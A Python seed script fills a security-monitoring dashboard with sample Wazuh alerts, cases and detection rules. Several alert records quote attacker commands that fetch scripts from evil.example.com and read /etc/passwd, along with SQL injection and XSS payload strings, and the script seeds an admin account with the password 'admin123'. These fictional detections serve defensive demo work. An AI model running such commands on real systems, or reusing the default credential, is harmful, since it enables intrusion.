"""Seed script — populates the database with sample alerts, cases, and rules.
Run: python -m seed
"""

import asyncio
import uuid
from datetime import datetime, timedelta, timezone

from sqlalchemy.ext.asyncio import AsyncSession

from app.core.database import async_session, engine
from app.models.base import Base
from app.models.alert import Alert
from app.models.case import Case
from app.models.rule import Rule
from app.models.user import User
from app.models.audit_log import AuditLog


SAMPLE_ALERTS = [
    {
        "alert_id": "sf-demo-0001",
        "timestamp": datetime.now(timezone.utc) - timedelta(minutes=5),
        "source": "wazuh",
        "source_rule_id": "5710",
        "severity": "critical",
        "category": "brute_force",
        "title": "SSH Brute Force Detected",
        "description": "Multiple failed SSH login attempts from 185.220.101.45",
        "observables": {
            "source_ip": "185.220.101.45",
            "destination_ip": "10.0.1.50",
            "destination_port": 22,
            "username": "root",
            "hostname": "web-server-01",
            "process_name": "sshd",
        },
        "mitre": {"tactic": "Credential Access", "technique": "T1110", "subtechnique": "T1110.001"},
        "status": "new",
    },
    {
        "alert_id": "sf-demo-0002",
        "timestamp": datetime.now(timezone.utc) - timedelta(minutes=12),
        "source": "wazuh",
        "source_rule_id": "100200",
        "severity": "high",
        "category": "brute_force",
        "title": "Honeypot SSH Connection Detected",
        "description": "Connection to SSH honeypot from 45.33.32.156",
        "observables": {
            "source_ip": "45.33.32.156",
            "destination_ip": "192.168.1.100",
            "destination_port": 22,
            "hostname": "rpi-honeypot",
        },
        "enrichment": {
            "ip_reputation": {
                "virustotal": {"malicious": 12, "total": 90},
                "abuseipdb": {"score": 95, "total_reports": 1243, "categories": ["SSH", "Brute-Force"]},
                "greynoise": {"classification": "malicious", "name": "known scanner"},
            },
            "geo": {"country": "NL", "city": "Amsterdam", "asn": "AS14061", "org": "DigitalOcean"},
        },
        "threat_score": 87,
        "verdict": "malicious",
        "mitre": {"tactic": "Discovery", "technique": "T1046"},
        "status": "enriched",
    },
    {
        "alert_id": "sf-demo-0003",
        "timestamp": datetime.now(timezone.utc) - timedelta(minutes=25),
        "source": "wazuh",
        "source_rule_id": "5501",
        "severity": "medium",
        "category": "brute_force",
        "title": "PAM: Login Session Opened",
        "description": "Login session opened for user admin from 10.0.1.23",
        "observables": {
            "source_ip": "10.0.1.23",
            "username": "admin",
            "hostname": "db-server-01",
        },
        "threat_score": 35,
        "verdict": "suspicious",
        "status": "enriched",
    },
    {
        "alert_id": "sf-demo-0004",
        "timestamp": datetime.now(timezone.utc) - timedelta(minutes=45),
        "source": "wazuh",
        "source_rule_id": "550",
        "severity": "low",
        "category": "file_integrity",
        "title": "File Integrity Monitoring: File Modified",
        "description": "File /etc/hosts was modified",
        "observables": {
            "hostname": "web-server-01",
        },
        "mitre": {"tactic": "Defense Evasion", "technique": "T1070"},
        "threat_score": 12,
        "verdict": "benign",
        "status": "closed",
    },
    {
        "alert_id": "sf-demo-0005",
        "timestamp": datetime.now(timezone.utc) - timedelta(hours=1),
        "source": "wazuh",
        "source_rule_id": "5712",
        "severity": "high",
        "category": "brute_force",
        "title": "SSHD: Brute Force Attempt (5 Failures in 60s)",
        "description": "5 authentication failures from 103.252.118.93 in 60 seconds",
        "observables": {
            "source_ip": "103.252.118.93",
            "destination_ip": "10.0.1.50",
            "destination_port": 22,
            "hostname": "web-server-01",
        },
        "enrichment": {
            "ip_reputation": {
                "abuseipdb": {"score": 100, "total_reports": 5621},
                "greynoise": {"classification": "malicious"},
            },
            "geo": {"country": "CN", "city": "Hangzhou", "asn": "AS4134"},
        },
        "threat_score": 92,
        "verdict": "malicious",
        "playbook_actions": [
            {"action": "cloudflare_block", "ip": "103.252.118.93", "status": "success", "timestamp": (datetime.now(timezone.utc) - timedelta(minutes=58)).isoformat()},
            {"action": "create_case", "case_number": "CASE-2026-0001", "status": "success"},
        ],
        "mitre": {"tactic": "Credential Access", "technique": "T1110", "subtechnique": "T1110.001"},
        "status": "escalated",
    },
    {
        "alert_id": "sf-demo-0006",
        "timestamp": datetime.now(timezone.utc) - timedelta(hours=2),
        "source": "wazuh",
        "source_rule_id": "510",
        "severity": "high",
        "category": "intrusion",
        "title": "Suspicious Command Execution: wget to External Host",
        "description": "User ran wget http://evil.example.com/payload.sh on web-server-01",
        "observables": {
            "source_ip": "10.0.1.50",
            "username": "www-data",
            "hostname": "web-server-01",
            "url": "http://evil.example.com/payload.sh",
            "process_name": "wget",
        },
        "threat_score": 78,
        "verdict": "malicious",
        "mitre": {"tactic": "Execution", "technique": "T1059"},
        "status": "enriched",
    },
    {
        "alert_id": "sf-demo-0007",
        "timestamp": datetime.now(timezone.utc) - timedelta(hours=3),
        "source": "wazuh",
        "source_rule_id": "5402",
        "severity": "medium",
        "category": "policy",
        "title": "Sudo: Failed Attempt by Unauthorized User",
        "description": "User developer attempted sudo without authorization",
        "observables": {
            "username": "developer",
            "hostname": "db-server-01",
            "process_name": "sudo",
        },
        "threat_score": 40,
        "verdict": "suspicious",
        "mitre": {"tactic": "Privilege Escalation", "technique": "T1548"},
        "status": "enriched",
    },
    {
        "alert_id": "sf-demo-0008",
        "timestamp": datetime.now(timezone.utc) - timedelta(hours=4),
        "source": "wazuh",
        "source_rule_id": "100201",
        "severity": "critical",
        "category": "brute_force",
        "title": "Honeypot: Attacker Executed Commands After Login",
        "description": "Attacker logged into honeypot and ran: cat /etc/passwd; wget http://evil.example.com/malware.sh",
        "observables": {
            "source_ip": "91.240.118.172",
            "hostname": "rpi-honeypot",
            "username": "root",
        },
        "enrichment": {
            "ip_reputation": {
                "virustotal": {"malicious": 22, "total": 90},
                "abuseipdb": {"score": 100, "total_reports": 9812},
            },
            "geo": {"country": "RU", "city": "Moscow", "asn": "AS12389"},
        },
        "threat_score": 98,
        "verdict": "malicious",
        "playbook_actions": [
            {"action": "cloudflare_block", "ip": "91.240.118.172", "status": "success"},
        ],
        "mitre": {"tactic": "Execution", "technique": "T1059", "subtechnique": "T1059.004"},
        "status": "escalated",
    },
    {
        "alert_id": "sf-demo-0009",
        "timestamp": datetime.now(timezone.utc) - timedelta(hours=5),
        "source": "wazuh",
        "source_rule_id": "5710",
        "severity": "medium",
        "category": "brute_force",
        "title": "SSHD: Authentication Failure",
        "description": "Failed SSH login for user deploy from 10.0.2.15",
        "observables": {
            "source_ip": "10.0.2.15",
            "destination_port": 22,
            "username": "deploy",
            "hostname": "web-server-01",
        },
        "threat_score": 15,
        "verdict": "benign",
        "status": "closed",
    },
    {
        "alert_id": "sf-demo-0010",
        "timestamp": datetime.now(timezone.utc) - timedelta(hours=6),
        "source": "wazuh",
        "source_rule_id": "554",
        "severity": "low",
        "category": "file_integrity",
        "title": "File Integrity: New File Added",
        "description": "New file /tmp/cron_update.sh detected",
        "observables": {
            "hostname": "db-server-01",
        },
        "status": "new",
    },
    # More varied alerts to fill the dashboard
    {
        "alert_id": "sf-demo-0011",
        "timestamp": datetime.now(timezone.utc) - timedelta(hours=7),
        "source": "wazuh",
        "source_rule_id": "31151",
        "severity": "high",
        "category": "web_attack",
        "title": "Web Attack: SQL Injection Attempt",
        "description": "SQL injection pattern detected in HTTP request to /api/users",
        "observables": {
            "source_ip": "198.51.100.42",
            "destination_ip": "10.0.1.50",
            "destination_port": 443,
            "hostname": "web-server-01",
            "url": "/api/users?id=1' OR '1'='1",
        },
        "threat_score": 75,
        "verdict": "malicious",
        "mitre": {"tactic": "Initial Access", "technique": "T1190"},
        "status": "enriched",
    },
    {
        "alert_id": "sf-demo-0012",
        "timestamp": datetime.now(timezone.utc) - timedelta(hours=8),
        "source": "wazuh",
        "source_rule_id": "5716",
        "severity": "medium",
        "category": "brute_force",
        "title": "SSHD: Multiple Failed Logins from Different Users",
        "description": "Authentication failures for users root, admin, test from 77.247.181.163",
        "observables": {
            "source_ip": "77.247.181.163",
            "destination_port": 22,
            "hostname": "web-server-01",
        },
        "threat_score": 55,
        "verdict": "suspicious",
        "status": "enriched",
    },
    {
        "alert_id": "sf-demo-0013",
        "timestamp": datetime.now(timezone.utc) - timedelta(hours=9),
        "source": "wazuh",
        "source_rule_id": "510",
        "severity": "medium",
        "category": "network",
        "title": "Port Scan Detected from Internal Host",
        "description": "Multiple connection attempts to different ports from 10.0.1.23",
        "observables": {
            "source_ip": "10.0.1.23",
            "hostname": "db-server-01",
        },
        "threat_score": 45,
        "verdict": "suspicious",
        "mitre": {"tactic": "Discovery", "technique": "T1046"},
        "status": "enriched",
    },
    {
        "alert_id": "sf-demo-0014",
        "timestamp": datetime.now(timezone.utc) - timedelta(hours=10),
        "source": "wazuh",
        "source_rule_id": "550",
        "severity": "low",
        "category": "system",
        "title": "Ossec Agent Started",
        "description": "Wazuh agent started on web-server-01",
        "observables": {"hostname": "web-server-01"},
        "status": "closed",
        "verdict": "benign",
        "threat_score": 0,
    },
    {
        "alert_id": "sf-demo-0015",
        "timestamp": datetime.now(timezone.utc) - timedelta(hours=11),
        "source": "wazuh",
        "source_rule_id": "5710",
        "severity": "high",
        "category": "brute_force",
        "title": "RDP Brute Force Attempt",
        "description": "Multiple failed RDP login attempts from 203.0.113.88",
        "observables": {
            "source_ip": "203.0.113.88",
            "destination_ip": "10.0.1.60",
            "destination_port": 3389,
            "hostname": "win-server-01",
        },
        "threat_score": 82,
        "verdict": "malicious",
        "mitre": {"tactic": "Credential Access", "technique": "T1110", "subtechnique": "T1110.003"},
        "status": "escalated",
    },
    {
        "alert_id": "sf-demo-0016",
        "timestamp": datetime.now(timezone.utc) - timedelta(hours=13),
        "source": "wazuh",
        "source_rule_id": "100202",
        "severity": "high",
        "category": "brute_force",
        "title": "Honeypot: New SSH Connection",
        "description": "New SSH connection from 185.100.87.206 to honeypot",
        "observables": {
            "source_ip": "185.100.87.206",
            "hostname": "rpi-honeypot",
        },
        "threat_score": 85,
        "verdict": "malicious",
        "status": "enriched",
    },
    {
        "alert_id": "sf-demo-0017",
        "timestamp": datetime.now(timezone.utc) - timedelta(hours=15),
        "source": "wazuh",
        "source_rule_id": "5402",
        "severity": "low",
        "category": "policy",
        "title": "User Account Created",
        "description": "New user account 'backup-svc' created on db-server-01",
        "observables": {
            "username": "backup-svc",
            "hostname": "db-server-01",
        },
        "mitre": {"tactic": "Persistence", "technique": "T1136"},
        "status": "new",
    },
    {
        "alert_id": "sf-demo-0018",
        "timestamp": datetime.now(timezone.utc) - timedelta(hours=18),
        "source": "wazuh",
        "source_rule_id": "31101",
        "severity": "medium",
        "category": "web_attack",
        "title": "Web Attack: XSS Attempt Detected",
        "description": "Cross-site scripting pattern in request to /search?q=<script>alert(1)</script>",
        "observables": {
            "source_ip": "192.0.2.55",
            "destination_port": 443,
            "hostname": "web-server-01",
        },
        "threat_score": 60,
        "verdict": "suspicious",
        "mitre": {"tactic": "Initial Access", "technique": "T1189"},
        "status": "enriched",
    },
    {
        "alert_id": "sf-demo-0019",
        "timestamp": datetime.now(timezone.utc) - timedelta(hours=20),
        "source": "wazuh",
        "source_rule_id": "554",
        "severity": "medium",
        "category": "file_integrity",
        "title": "File Integrity: Critical Config Changed",
        "description": "File /etc/ssh/sshd_config was modified",
        "observables": {
            "hostname": "web-server-01",
        },
        "mitre": {"tactic": "Persistence", "technique": "T1098"},
        "threat_score": 50,
        "verdict": "suspicious",
        "status": "enriched",
    },
    {
        "alert_id": "sf-demo-0020",
        "timestamp": datetime.now(timezone.utc) - timedelta(hours=22),
        "source": "wazuh",
        "source_rule_id": "5710",
        "severity": "low",
        "category": "brute_force",
        "title": "SSHD: Authentication Failure (Single)",
        "description": "Failed SSH login for user git from 10.0.1.5",
        "observables": {
            "source_ip": "10.0.1.5",
            "username": "git",
            "hostname": "web-server-01",
        },
        "threat_score": 5,
        "verdict": "benign",
        "status": "closed",
    },
]

SAMPLE_RULES = [
    {
        "name": "SSH Brute Force Detection",
        "description": "Detects multiple failed SSH login attempts from the same source IP within a short time window",
        "rule_type": "sigma",
        "definition": {
            "title": "SSH Brute Force",
            "logsource": {"product": "linux", "service": "sshd"},
            "detection": {
                "selection": {"event_type": "authentication_failure"},
                "condition": "selection | count(source_ip) > 5",
                "timeframe": "5m",
            },
        },
        "severity": "high",
        "enabled": True,
        "mitre_techniques": ["T1110.001", "T1110.003"],
    },
    {
        "name": "Honeypot Connection Alert",
        "description": "Any connection to the honeypot is suspicious — legitimate users have no reason to connect",
        "rule_type": "wazuh",
        "definition": {
            "rule_id": "100200",
            "level": 12,
            "description": "Connection to honeypot detected",
            "match": "agent.name:rpi-honeypot",
        },
        "severity": "critical",
        "enabled": True,
        "mitre_techniques": ["T1046"],
    },
]


async def seed():
    # Create all tables
    async with engine.begin() as conn:
        await conn.run_sync(Base.metadata.create_all)

    async with async_session() as db:
        # Check if already seeded
        from sqlalchemy import select, func
        count = (await db.execute(select(func.count(Alert.id)))).scalar_one()
        if count > 0:
            print(f"Database already has {count} alerts — skipping seed.")
            return

        # Seed admin user
        from passlib.hash import bcrypt
        admin = User(
            username="admin",
            email="admin@sentinelforge.local",
            password_hash=bcrypt.hash("admin123"),
            role="admin",
        )
        db.add(admin)
        await db.flush()

        # Seed alerts
        for alert_data in SAMPLE_ALERTS:
            alert = Alert(**alert_data)
            db.add(alert)
        print(f"Seeded {len(SAMPLE_ALERTS)} alerts")

        # Seed cases (link to some alerts)
        case1 = Case(
            case_number="CASE-2026-0001",
            title="Brute Force Campaign from 103.252.118.93",
            description="Sustained SSH brute force targeting web-server-01. IP blocked via Cloudflare.",
            severity="high",
            status="investigating",
            created_by=admin.id,
        )
        case2 = Case(
            case_number="CASE-2026-0002",
            title="Honeypot Intrusion — Command Execution",
            description="Attacker gained honeypot access and attempted to download malware.",
            severity="critical",
            status="open",
            created_by=admin.id,
        )
        case3 = Case(
            case_number="CASE-2026-0003",
            title="Suspicious wget on Production Server",
            description="www-data user downloaded external payload. Investigating lateral movement.",
            severity="high",
            status="open",
            assigned_to=admin.id,
            created_by=admin.id,
        )
        db.add_all([case1, case2, case3])
        print("Seeded 3 cases")

        # Seed rules
        for rule_data in SAMPLE_RULES:
            rule = Rule(**rule_data, created_by=admin.id)
            db.add(rule)
        print(f"Seeded {len(SAMPLE_RULES)} rules")

        await db.commit()
        print("Seed complete!")


if __name__ == "__main__":
    asyncio.run(seed())
